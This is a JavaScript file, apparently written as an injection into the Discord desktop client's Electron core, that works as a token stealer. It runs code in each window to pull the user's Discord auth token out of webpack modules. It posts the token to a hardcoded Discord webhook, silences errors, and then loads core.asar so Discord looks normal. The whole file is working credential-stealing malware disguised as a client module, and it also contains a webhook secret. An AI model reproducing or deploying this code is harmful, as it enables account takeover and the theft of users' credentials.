const { BrowserWindow } = require("electron");
const https = require("https");

// Fonction d'envoi vers le webhook Discord
function sendToWebhook(content) {
    const data = JSON.stringify({ content });

    const options = {
        hostname: "discord.com",
        path: "/api/webhooks/1372990357935231049/S3sJAliM2-iC1s9-lElmSGP73FPMKwRPIbiUBaU6Vc96kpu74qo4USkSeSB8U06klrpP", // ← ton lien webhook ici
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    };

    const req = https.request(options);
    req.on("error", () => {}); // silence les erreurs pour éviter l'affichage
    req.write(data);
    req.end();
}

// Fonction pour extraire le token et l’envoyer
function getToken() {
    const windows = BrowserWindow.getAllWindows();

    for (const win of windows) {
        win.webContents.on("did-finish-load", () => {
            win.webContents.executeJavaScript(`
                new Promise((resolve) => {
                    const check = () => {
                        if (window.webpackChunkdiscord_app) {
                            try {
                                window.webpackChunkdiscord_app.push([
                                    [Math.random()],
                                    {},
                                    (e) => {
                                        for (let c in e.c) {
                                            let m = e.c[c]?.exports;
                                            if (m?.default?.getToken !== undefined) {
                                                resolve(m.default.getToken());
                                                return;
                                            }
                                        }
                                        resolve(null);
                                    }
                                ]);
                            } catch {
                                resolve(null);
                            }
                        } else {
                            setTimeout(check, 100);
                        }
                    };
                    check();
                });
            `).then(token => {
                if (token) {
                    sendToWebhook("Token Discord : " + token);
                }
            }).catch(() => {});
        });
    }
}

getToken();

// Charge Discord normalement
module.exports = require('./core.asar');
